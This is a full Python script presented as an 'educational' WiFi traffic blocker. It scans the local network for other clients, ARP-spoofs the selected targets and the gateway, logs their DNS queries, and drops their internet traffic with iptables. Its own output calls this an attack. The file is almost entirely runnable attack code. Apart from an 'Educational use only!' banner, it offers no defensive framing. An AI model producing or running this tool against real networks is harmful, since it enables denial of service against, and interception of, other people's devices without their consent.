#!/usr/bin/env python3
"""
WiFi Traffic Blocker - Educational Tool
Blocks internet access for clients while keeping them connected to AP
"""

import subprocess
import time
import threading
import argparse
from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import netifaces
import ipaddress
import os
import sys

class WiFiTrafficController:
    def __init__(self, interface, gateway_ip=None):
        self.interface = interface
        self.gateway_ip = gateway_ip or self.get_gateway_ip()
        self.gateway_mac = None
        self.our_ip = self.get_our_ip()
        self.our_mac = self.get_our_mac()
        self.target_clients = []
        self.running = False
        self.stats = {'dns_blocked': 0, 'arp_sent': 0}
        
    def get_our_ip(self):
        """Get our IP address"""
        try:
            addrs = netifaces.ifaddresses(self.interface)
            if netifaces.AF_INET in addrs:
                return addrs[netifaces.AF_INET][0]['addr']
        except:
            return None
    
    def get_our_mac(self):
        """Get our MAC address"""
        try:
            return get_if_hwaddr(self.interface)
        except:
            return None
    
    def get_gateway_ip(self):
        """Get gateway IP"""
        try:
            # Get from routing table
            result = subprocess.run(['ip', 'route', 'show', 'dev', self.interface], 
                                  capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'default via' in line:
                    return line.split('via')[1].split()[0]
            
            # Fallback: assume .1 is gateway
            addrs = netifaces.ifaddresses(self.interface)
            if netifaces.AF_INET in addrs:
                ip_info = addrs[netifaces.AF_INET][0]
                ip = ip_info['addr']
                netmask = ip_info['netmask']
                network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
                return str(network.network_address + 1)
        except:
            pass
        return None
    
    def get_gateway_mac(self):
        """Get gateway MAC address"""
        if not self.gateway_ip:
            return None
        
        try:
            # Ping gateway first
            subprocess.run(['ping', '-c', '3', self.gateway_ip], 
                         capture_output=True, timeout=10)
            
            # Get MAC from ARP table
            result = subprocess.run(['arp', self.gateway_ip], 
                                  capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if ':' in line:
                    parts = line.split()
                    for part in parts:
                        if ':' in part and len(part.split(':')) == 6:
                            return part.lower()
        except:
            pass
        return None
    
    def get_network_info(self):
        """Get network range"""
        try:
            addrs = netifaces.ifaddresses(self.interface)
            if netifaces.AF_INET in addrs:
                ip_info = addrs[netifaces.AF_INET][0]
                ip = ip_info['addr']
                netmask = ip_info['netmask']
                network = ipaddress.IPv4Network(f"{ip}/{netmask}", strict=False)
                return str(network)
        except:
            pass
        return None
    
    def scan_clients(self):
        """Scan for connected clients"""
        print("🔍 Discovering clients...")
        clients = []
        network = self.get_network_info()
        
        if not network:
            print("❌ Could not determine network range")
            return []
        
        print(f"📡 Scanning: {network}")
        
        # Method 1: Nmap scan
        try:
            result = subprocess.run(['nmap', '-sn', network], 
                                  capture_output=True, text=True, timeout=60)
            
            lines = result.stdout.split('\n')
            current_ip = None
            
            for line in lines:
                if 'Nmap scan report for' in line:
                    parts = line.split()
                    current_ip = parts[-1].strip('()')
                elif 'MAC Address:' in line and current_ip:
                    parts = line.split()
                    mac = parts[2].lower()
                    if current_ip not in [self.gateway_ip, self.our_ip]:
                        clients.append({'ip': current_ip, 'mac': mac})
                    current_ip = None
        except Exception as e:
            print(f"❌ Nmap failed: {e}")
        
        # Method 2: ARP table
        try:
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if '(' in line and ')' in line:
                    try:
                        parts = line.split()
                        ip = parts[1].strip('()')
                        for part in parts:
                            if ':' in part and len(part.split(':')) == 6:
                                mac = part.lower()
                                if ip not in [self.gateway_ip, self.our_ip]:
                                    if not any(c['ip'] == ip for c in clients):
                                        clients.append({'ip': ip, 'mac': mac})
                                break
                    except:
                        continue
        except:
            pass
        
        return clients
    
    def arp_spoof(self, target_ip, target_mac):
        """Perform ARP spoofing"""
        try:
            # Tell target we are the gateway
            ether1 = Ether(src=self.our_mac, dst=target_mac)
            arp1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                      psrc=self.gateway_ip, hwsrc=self.our_mac)
            
            # Tell gateway we are the target
            ether2 = Ether(src=self.our_mac, dst=self.gateway_mac)
            arp2 = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                      psrc=target_ip, hwsrc=self.our_mac)
            
            sendp(ether1/arp1, iface=self.interface, verbose=False)
            sendp(ether2/arp2, iface=self.interface, verbose=False)
            self.stats['arp_sent'] += 2
        except Exception as e:
            print(f"❌ ARP error: {e}")
    
    def dns_monitor(self):
        """Monitor and block DNS queries"""
        def process_packet(packet):
            try:
                if packet.haslayer(DNS) and packet[DNS].qr == 0:
                    if packet[IP].src in [c['ip'] for c in self.target_clients]:
                        domain = packet[DNS].qd.qname.decode().rstrip('.')
                        print(f"🚫 Blocked DNS: {packet[IP].src} → {domain}")
                        self.stats['dns_blocked'] += 1
            except:
                pass
        
        try:
            sniff(iface=self.interface, filter="udp port 53", prn=process_packet, 
                  stop_filter=lambda x: not self.running)
        except:
            pass
    
    def block_traffic(self):
        """Block internet traffic using iptables"""
        for client in self.target_clients:
            # Block all outbound traffic except local network
            subprocess.run([
                'iptables', '-I', 'FORWARD', '-s', client['ip'], 
                '!', '-d', self.get_network_info(), '-j', 'DROP'
            ], capture_output=True)
            print(f"🔒 Blocked: {client['ip']}")
    
    def unblock_traffic(self):
        """Remove blocking rules"""
        for client in self.target_clients:
            while True:
                result = subprocess.run([
                    'iptables', '-D', 'FORWARD', '-s', client['ip'], 
                    '!', '-d', self.get_network_info(), '-j', 'DROP'
                ], capture_output=True)
                if result.returncode != 0:
                    break
    
    def start_arp_spoofing(self):
        """Continuous ARP spoofing"""
        while self.running:
            for client in self.target_clients:
                self.arp_spoof(client['ip'], client['mac'])
            time.sleep(1)
    
    def display_stats(self):
        """Display statistics"""
        while self.running:
            time.sleep(10)
            print(f"📊 ARP: {self.stats['arp_sent']} | DNS Blocked: {self.stats['dns_blocked']} | Targets: {len(self.target_clients)}")
    
    def start_attack(self, target_ips=None):
        """Start the attack"""
        print("🚀 WiFi Traffic Blocker")
        print("⚠️  Educational use only!")
        
        # Get gateway MAC
        self.gateway_mac = self.get_gateway_mac()
        if not self.gateway_mac:
            print("❌ Cannot find gateway MAC!")
            return
        
        print(f"🌐 Gateway: {self.gateway_ip} ({self.gateway_mac})")
        
        # Enable IP forwarding
        subprocess.run(['sysctl', 'net.ipv4.ip_forward=1'], capture_output=True)
        
        # Get targets
        if not target_ips:
            clients = self.scan_clients()
            if not clients:
                print("❌ No clients found")
                return
            
            print(f"✅ Found {len(clients)} clients:")
            for i, client in enumerate(clients):
                print(f"{i+1}. {client['ip']} ({client['mac']})")
            
            selection = input("Select targets (numbers or 'all'): ")
            if selection.lower() == 'all':
                self.target_clients = clients
            else:
                indices = [int(x.strip()) - 1 for x in selection.split(',')]
                self.target_clients = [clients[i] for i in indices if 0 <= i < len(clients)]
        else:
            all_clients = self.scan_clients()
            self.target_clients = [c for c in all_clients if c['ip'] in target_ips]
        
        if not self.target_clients:
            print("❌ No targets selected")
            return
        
        print(f"🎯 Targeting {len(self.target_clients)} clients")
        
        self.running = True
        
        # Start threads
        threading.Thread(target=self.start_arp_spoofing, daemon=True).start()
        threading.Thread(target=self.dns_monitor, daemon=True).start()
        threading.Thread(target=self.display_stats, daemon=True).start()
        
        # Block traffic
        self.block_traffic()
        
        print("🔥 Attack started! Press Ctrl+C to stop...")
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_attack()
    
    def stop_attack(self):
        """Stop attack and cleanup"""
        print("\n🛑 Stopping...")
        self.running = False
        
        # Cleanup
        self.unblock_traffic()
        
        # Restore ARP
        for client in self.target_clients:
            try:
                ether = Ether(src=self.gateway_mac, dst=client['mac'])
                arp = ARP(op=2, pdst=client['ip'], hwdst=client['mac'],
                         psrc=self.gateway_ip, hwsrc=self.gateway_mac)
                sendp(ether/arp, iface=self.interface, verbose=False)
            except:
                pass
        
        print("✅ Cleanup complete")

def main():
    parser = argparse.ArgumentParser(description='WiFi Traffic Blocker')
    parser.add_argument('-i', '--interface', required=True, help='Network interface')
    parser.add_argument('-t', '--targets', nargs='+', help='Target IP addresses')
    parser.add_argument('--scan', action='store_true', help='Scan only')
    
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        print("❌ Run as root!")
        sys.exit(1)
    
    controller = WiFiTrafficController(args.interface)
    
    if args.scan:
        clients = controller.scan_clients()
        if clients:
            print(f"✅ Found {len(clients)} clients:")
            for client in clients:
                print(f"  {client['ip']} ({client['mac']})")
        return
    
    try:
        controller.start_attack(args.targets)
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
